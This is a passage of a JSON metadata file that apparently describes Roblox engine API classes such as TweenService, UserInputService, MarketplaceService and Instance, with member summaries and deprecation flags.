ratio.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIScale","Summary":"Uniformly scales a GUI object and all its children.","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Scale","Summary":"The scale factor to apply.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UIPadding","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":26,"Browsable":true,"PreferredParent":"","Members":[{"Name":"PaddingLeft","Summary":"The padding to apply on the left side relative to the parent's normal size.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PaddingRight","Summary":"The padding to apply on the right side relative to the parent's normal size.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PaddingTop","Summary":"The padding to apply on the top side relative to the parent's normal size.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PaddingBottom","Summary":"The padding to apply on the bottom side relative to the parent's normal size.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenBase","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"PlaybackState","Summary":"The current state of how the tween is animating. Possible values are Begin, Playing, Paused, Completed and Cancelled. This property is modified by using functions such as Tween:Play(), Tween:Pause(), and Tween:Cancel(). Read-only.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Play","Summary":"Starts or resumes (if Tween.PlaybackState is Paused) the tween animation. If current PlaybackState is Cancelled, this property will reset the tween to the beginning properties and play the animations from the beginning.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Pause","Summary":"Temporarily stops the tween animation. Animation can be resumed by calling Play().","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Cancel","Summary":"Stops the tween animation. Animation can be restarted by calling Play(). Animation will start from the beginning values.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Completed","Summary":"Fires when the tween either reaches PlaybackState Completed or Cancelled. PlaybackState of one of these types is passed as the first arg to the function listening to this event.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Tween","Summary":"An object linked to an instance that animates properties on the instance over a specified period of time. Useful for easily moving UI objects around, rotating objects, etc. without having to write a lot of code. To create a new tween, please use TweenService:Create.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Instance","Summary":"The object this tween is operating on. Read-only.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenInfo","Summary":"Specifies how the tween animates. Read-only.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TweenService","Summary":"Service responsible for creating tweens on instances.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StarterGui","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":46,"Browsable":true,"PreferredParent":"","Members":[{"Name":"SetCoreGuiEnabled","Summary":"Will stop/begin certain core gui elements being rendered. See CoreGuiType for core guis that can be modified.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetCoreGuiEnabled","Summary":"Returns a boolean describing whether a CoreGuiType is currently being rendered.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GuiService","Summary":"The GuiService is a special service, which currently allows developers to control what GuiObject is currently being selected by the Gamepad Gui navigator, and allows clients to check if Roblox's main menu is currently open. This service has a lot of hidden members, which are mainly used internally by Roblox's CoreScripts.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"GetGuiInset","Summary":"Returns a Tuple containing two Vector2 values representing the offset of user GUIs in pixels from the top right corner of the screen and the bottom right corner of the screen respectively.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ContextActionService","Summary":"A service used to bind input to various lua functions.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"BindAction","Summary":"Binds 'functionToBind' to fire when any 'inputTypes' happen. InputTypes can be variable in number and type. Types can be Enum.KeyCode, single character strings corresponding to keys, or Enum.UserInputType. 'actionName' is a key used by many other ContextActionService functions to query state. 'createTouchButton' if true will create a button on screen on touch devices.  This button will fire 'functionToBind' with three arguments: first argument is the actionName, second argument is the UserInputState of the input, and the third is the InputObject that fired this function. If 'functionToBind' yields or returns nil or Enum.ContextActionResult.Sink, the input will be sunk. If it returns Enum.ContextActionResult.Pass, the next bound action in the stack will be invoked.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetTitle","Summary":"If 'actionName' key contains a bound action, then 'title' is set as the title of the touch button. Does nothing if a touch button was not created. No guarantees are made whether title will be set when button is manipulated.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetDescription","Summary":"If 'actionName' key contains a bound action, then 'description' is set as the description of the bound action. This description will appear for users in a listing of current actions availables.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetImage","Summary":"If 'actionName' key contains a bound action, then 'image' is set as the image of the touch button. Does nothing if a touch button was not created. No guarantees are made whether image will be set when button is manipulated.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetPosition","Summary":"If 'actionName' key contains a bound action, then 'position' is set as the position of the touch button. Does nothing if a touch button was not created. No guarantees are made whether position will be set when button is manipulated.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UnbindAction","Summary":"If 'actionName' key contains a bound action, removes function from being called by all input that it was bound by (if function was also bound by a different action name as well, those bound input are still active). Will also remove any touch button created (if button was manipulated manually there is no guarantee it will be cleaned up).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UnbindAllActions","Summary":"Removes all functions bound. No actionNames will remain. All touch buttons will be removed. If button was manipulated manually there is no guarantee it will be cleaned up.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetBoundActionInfo","Summary":"Returns a table with info regarding the function bound with 'actionName'. Table has the keys 'title' (current title that was set with SetTitle) 'image' (image set with SetImage) 'description' (description set with SetDescription) 'inputTypes' (tuple containing all input bound for this 'actionName') 'createTouchButton' (whether or not we created a touch button for this 'actionName').","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetAllBoundActionInfo","Summary":"Returns a table with all bound action info. Each entry is a key with 'actionName' and value being the same table you would get from ContextActionService:GetBoundActionInfo('actionName').","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetButton","Summary":"If 'actionName' key contains a bound action, then this will return the touch button (if was created). Returns nil if a touch button was not created. No guarantees are made whether button will be retrievable when button is manipulated.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PointsService","Summary":"A service used to query and award points for Roblox users using the universal point system.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"PointsAwarded","Summary":"Fired when points are successfully awarded 'userId'. Also returns the updated balance of points for usedId in universe via 'userBalanceInUniverse', total points via 'userTotalBalance', and the amount points that were awarded via 'pointsAwarded'. This event fires on the server and also all clients in the game that awarded the points.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AwardPoints","Summary":"Will attempt to award the 'amount' points to 'userId', returns 'userId' awarded to, the number of points awarded, the new point total the user has in the game, and the total number of points the user now has. Will also fire PointsService.PointsAwarded. Works with server scripts ONLY.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetPointBalance","Summary":"Returns the overall balance of points that player with userId has (the sum of all points across all games). Works with server scripts ONLY.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetGamePointBalance","Summary":"Returns the balance of points that player with userId has in the current game (all placeID points combined within the game). Works with server scripts ONLY.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetAwardablePoints","Summary":"Returns the number of points the current universe can award to players. Works with server scripts ONLY.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Chat","Summary":"","ExplorerOrder":51,"ExplorerImageIndex":33,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ChatService","Summary":"","ExplorerOrder":51,"ExplorerImageIndex":33,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LocalizationService","Summary":"","ExplorerOrder":-1,"ExplorerImageIndex":92,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MarketplaceService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":46,"Browsable":true,"PreferredParent":"","Members":[{"Name":"PromptPurchase","Summary":"Will prompt 'player' to purchase the item associated with 'assetId'.  'equipIfPurchased' is an optional argument that will give the item to the player immediately if they buy it (only applies to gear).  'currencyType' is also optional and will attempt to prompt the user with a specified currency if the product can be purchased with this currency, otherwise we use the default currency of the product.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetProductInfo","Summary":"Takes one argument \"assetId\" which should be a number of an asset on www.roblox.com.  Returns a table containing the product information (if this process fails, returns an empty table).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PlayerOwnsAsset","Summary":"Checks to see if 'Player' owns the product associated with 'assetId'. Returns true if the player owns it, false otherwise. This call will produce a warning if called on a guest player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ProcessReceipt","Summary":"Callback that is executed for pending Developer Product receipts.\n            \n            If this function does not return Enum.ProductPurchaseDecision.PurchaseGranted, then you will not be granted the money for the purchase!\n            \n            The callback will be invoked with a table, containing the following informational fields:\n            PlayerId - the id of the player making the purchase.\n            PlaceIdWherePurchased - the specific place where the purchase was made.\n            PurchaseId - a unique identifier for the purchase, should be used to prevent granting an item multiple times for one purchase.\n            ProductId - the id of the purchased product.\n            CurrencyType - the type of currency used (Tix, Robux).\n            CurrencySpent - the amount of currency spent on the product for this purchase.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PromptPurchaseFinished","Summary":"Fired when a 'player' dismisses a purchase dialog for 'assetId'.  If the player purchased the item 'isPurchased' will be true, otherwise it will be false. This call will produce a warning if called on a guest player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UserInputService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"TouchEnabled","Summary":"Returns true if the local device accepts touch input, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"KeyboardEnabled","Summary":"Returns true if the local device accepts keyboard input, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseEnabled","Summary":"Returns true if the local device accepts mouse input, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AccelerometerEnabled","Summary":"Returns true if the local device has an accelerometer, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GyroscopeEnabled","Summary":"Returns true if the local device has an gyroscope, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchTap","Summary":"Fired when a user taps their finger on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the tap gesture. This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchPinch","Summary":"Fired when a user pinches their fingers on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the pinch gesture. 'scale' is a float that indicates the difference from the beginning of the pinch gesture. 'velocity' is a float indicating how quickly the pinch gesture is happening. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchSwipe","Summary":"Fired when a user swipes their fingers on a TouchEnabled device. 'swipeDirection' is an Enum.SwipeDirection, indicating the direction the user swiped. 'numberOfTouches' is an int that indicates how many touches were involved with the gesture.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchLongPress","Summary":"Fired when a user holds at least one finger for a short amount of time on the same screen position on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchRotate","Summary":"Fired when a user rotates two fingers on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'rotation' is a float indicating how much the rotation has gone from the start of the gesture. 'velocity' is a float that indicates how quickly the gesture is being performed. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchPan","Summary":"Fired when a user drags at least one finger on a TouchEnabled device. 'touchPositions' is a Lua array of Vector2, each indicating the position of all the fingers involved in the gesture. 'totalTranslation' is a Vector2, indicating how far the pan gesture has gone from its starting point. 'velocity' is a Vector2 that indicates how quickly the gesture is being performed in each dimension. 'state' indicates the Enum.UserInputState of the gesture.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchStarted","Summary":"Fired when a user places their finger on a TouchEnabled device. 'touch' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchMoved","Summary":"Fired when a user moves their finger on a TouchEnabled device. 'touch' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchEnded","Summary":"Fired when a user moves their finger on a TouchEnabled device. 'touch' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputBegan","Summary":"Fired when a user begins interacting via a Human-Computer Interface device (Mouse button down, touch begin, keyboard button down, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputChanged","Summary":"Fired when a user changes interacting via a Human-Computer Interface device (Mouse move, touch move, mouse wheel, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InputEnded","Summary":"Fired when a user stops interacting via a Human-Computer Interface device (Mouse button up, touch end, keyboard button up, etc.). 'inputObject' is an InputObject, which contains useful data for querying user input.  This event only fires locally.  This event will always fire regardless of game state.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextBoxFocused","Summary":"Fired when a user clicks/taps on a textbox to begin text entry. Argument is the textbox that was put in focus. This also fires if a textbox forces focus on the user. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TextBoxFocusReleased","Summary":"Fired when a user stops text entry into a textbox (usually by pressing return or clicking/tapping somewhere else on the screen). Argument is the textbox that was taken out of focus. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DeviceAccelerationChanged","Summary":"Fired when a user moves a device that has an accelerometer. This is fired with an InputObject, which has type Enum.InputType.Accelerometer, and position that shows the g force in each local device axis. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DeviceGravityChanged","Summary":"Fired when the force of gravity changes on a device that has an accelerometer. This is fired with an InputObject, which has type Enum.InputType.Accelerometer, and position that shows the g force in each local device axis. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DeviceRotationChanged","Summary":"Fired when a user rotates a device that has an gyroscope. This is fired with an InputObject, which has type Enum.InputType.Gyroscope, and position that shows total rotation in each local device axis.  The delta property describes the amount of rotation that last happened. A second argument of Vector4 is the device's current quaternion rotation in reference to it's default reference frame. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetDeviceAcceleration","Summary":"Returns an InputObject that describes the device's current acceleration. This is fired with an InputObject, which has type Enum.InputType.Accelerometer, and position that shows the g force in each local device axis.  The delta property describes the amount of rotation that last happened. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetDeviceGravity","Summary":"Returns an InputObject that describes the device's current gravity vector. This is fired with an InputObject, which has type Enum.InputType.Accelerometer, and position that shows the g force in each local device axis. The delta property describes the amount of rotation that last happened. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetDeviceRotation","Summary":"Returns an InputObject and a Vector4 that describes the device's current rotation vector. This is fired with an InputObject, which has type Enum.InputType.Gyroscope, and position that shows total rotation in each local device axis. The delta property describes the amount of rotation that last happened. The Vector4 is the device's current quaternion rotation in reference to it's default reference frame. This event only fires locally.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Sky","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":28,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ColorCorrectionEffect","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":83,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Brightness","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Contrast","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Saturation","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BloomEffect","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":83,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Intensity","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Threshold","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Size","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BlurEffect","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":83,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Size","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SunRaysEffect","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":83,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Intensity","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Spread","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Motor","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Humanoid","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":9,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MoveTo","Summary":"Attempts to move the Humanoid and it's associated character to 'part'. 'location' is used as an offset from part's origin.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Jump","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Sit","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TakeDamage","Summary":"Decreases health by the amount.  Use this instead of changing health directly to make sure weapons are filtered for things such as ForceField(s).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UnequipTools","Summary":"Takes any active gear/tools that the Humanoid is using and puts them into the backpack.  This function only works on Humanoids with a corresponding Player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"EquipTool","Summary":"Takes a specified tool and equips it to the Humanoid's Character.  Tool argument should be of type 'Tool'.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NameOcclusion","Summary":"Sets how to display other humanoid names to this humanoid's player. <a href=\"http://wiki.roblox.com/index.php/NameOcclusion\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyColors","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Shirt","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":43,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Pants","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":44,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ShirtGraphic","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":40,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Skin","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"DebugSettings","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FaceInstance","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GameSettings","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GlobalSettings","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Item","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkPeer","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkSettings","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PVInstance","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"CoordinateFrame","Summary":"Deprecated. Use CFrame instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RenderSettings","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RootInstance","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServiceProvider","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"service","Summary":"Use GetService() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ProfilingItem","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkMarker","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Hopper","Summary":"Use StarterPack instead","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Instance","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"Archivable","Summary":"Determines whether or not an Instance can be saved when the game closes/attempts to save the game. Note: this only applies to games that use Data Persistence, or SavePlaceAsync.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ClassName","Summary":"The string name of this Instance's most derived class.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Parent","Summary":"The Instance that is directly above this Instance in the tree.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetDebugId","Summary":"This function is for internal testing. Don't use in production code","Browsable":"false","Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Clone","Summary":"Returns a copy of this Object and all its children. The copy's Parent is nil","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"clone","Summary":"Use Clone() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"isA","Summary":"Use IsA() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"IsA","Summary":"Returns a boolean if this Instance is of type 'className' or a is a subclass of type 'className'.  If 'className' is not a valid class type in ROBLOX, this function will always return false.  <a href=\"http://wiki.roblox.com/index.php/IsA\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstChild","Summary":"Returns the first child of this Instance that matches the first argument 'name'.  The second argument 'recursive' is an optional boolean (defaults to false) that will force the call to traverse down thru all of this Instance's descendants until it finds an object with a name that matches the 'name' argument.  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstChildOfClass","Summary":"Returns the first child of this Instance that with a ClassName equal to 'className'.  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstChildWhichIsA","Summary":"Returns the first child of this Instance that :IsA(className).  The second argument 'recursive' is an optional boolean (defaults to false) that will force the call to traverse down thru all of this Instance's descendants until it finds an object with a name that matches the 'className' argument.  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstAncestor","Summary":"Returns the first ancestor of this Instance that matches the first argument 'name'.  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstAncestorOfClass","Summary":"Returns the first ancestor of this Instance with a ClassName equal to 'className'.  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindFirstAncestorWhichIsA","Summary":"Returns the first ancestor of this Instance that :IsA(className).  The function will return nil if no Instance is found.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetFullName","Summary":"Returns a string that shows the path from the root node (DataModel) to this Instance.  This string does not include the root node (DataModel).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"children","Summary":"Use GetChildren() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"getChildren","Summary":"Use GetChildren() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetChildren","Summary":"Returns a read-only table of this Object's children","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetDescendants","Summary":"Returns an array containing all of the descendants of the instance. Returns in preorder traversal, or in other words, where the parents come before their children, depth first.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Remove","Summary":"Deprecated. Use ClearAllChildren() to get rid of all child objects, or Destroy() to invalidate this object and its descendants","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"remove","Summary":"Use Remove() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"ClearAllChildren","Summary":"Removes all children (but not this object) from the workspace.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Destroy","Summary":"Removes object and all of its children from the workspace. Disconnects object and 